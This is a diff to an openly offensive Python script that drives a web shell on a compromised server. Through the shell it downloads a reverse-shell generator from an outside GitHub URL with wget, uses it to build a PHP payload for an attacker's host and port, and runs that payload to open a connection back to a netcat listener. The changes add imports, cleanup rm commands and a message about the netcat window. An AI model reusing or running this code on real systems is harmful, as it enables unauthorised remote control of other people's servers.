@@ -1,3 +1,7 @@
+#!/usr/bin/python3
+ 
+import socket
+import sys
 import argparse
 import requests
 from datetime import datetime
@@ -75,6 +79,7 @@ time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 # open the shell
 print(f'\n[+] Web shell opened at {time_display}\n[+] Injecting payload generator...')
 
+inject('rm /tmp/revgen.py')
 inject('wget -O /tmp/revgen.py https://raw.githubusercontent.com/evilcater/H4cX/master/Tools/auto_reverse_shell/autorev.py')
 
 if response(inject('file /tmp/revgen.py')) == '/tmp/revgen.py: ASCII text, with very long lines':
@@ -88,6 +93,7 @@ else:
 		if user_data == 'exit': exit()
 		print(response(inject(user_data)))
     
+inject('rm /tmp/realexploit.php')
 inject(f'python3 /tmp/revgen.py {lhost} {lport} realexploit.php')
 
 if response(inject('file /tmp/realexploit.php')) == '/tmp/realexploit.php: PHP script, ASCII text, with very long lines':
@@ -102,7 +108,7 @@ else:
 		print(response(inject(user_data)))
 
 
-print('[+] Launching the script : php -f /tmp/realexploit.php...')
-inject('php -f /tmp/realexploit.php')
+print('[+] Launching the script : php -f /tmp/realexploit.php... (Please check your netcat window)')
 
+inject('php -f /tmp/realexploit.php')
 
